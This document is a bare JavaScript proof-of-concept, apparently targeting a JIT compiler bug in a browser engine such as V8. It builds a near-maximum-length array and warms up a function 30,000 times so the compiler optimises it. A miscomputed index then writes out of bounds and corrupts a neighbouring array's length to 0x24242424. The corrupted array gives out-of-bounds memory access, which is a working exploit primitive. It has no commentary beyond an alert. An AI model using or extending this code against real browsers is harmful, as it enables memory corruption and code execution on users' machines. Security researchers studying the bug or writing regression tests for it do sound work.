array = Array(0x40000).fill(1.1);
args = Array(0x100 - 1).fill(array);
args.push(Array(0x40000 - 4).fill(2.2));
giant_array = Array.prototype.concat.apply([], args);
giant_array.splice(giant_array.length, 0, 3.3, 3.3, 3.3);

length_as_double =
    new Float64Array(new BigUint64Array([0x2424242400000000n]).buffer)[0];

function trigger(array) {
  var x = array.length;
  x -= 67108861;
  x = Math.max(x, 0);
  x *= 6;
  x -= 5;
  x = Math.max(x, 0);

  let corrupting_array = [0.1, 0.1];
  let corrupted_array = [0.1];

  corrupting_array[x] = length_as_double;
  return [corrupting_array, corrupted_array];
}

for (let i = 0; i < 30000; ++i) {
  trigger(giant_array);
}

corrupted_array = trigger(giant_array)[1];
alert('corrupted array length: ' + corrupted_array.length.toString(16));
corrupted_array[0x123456];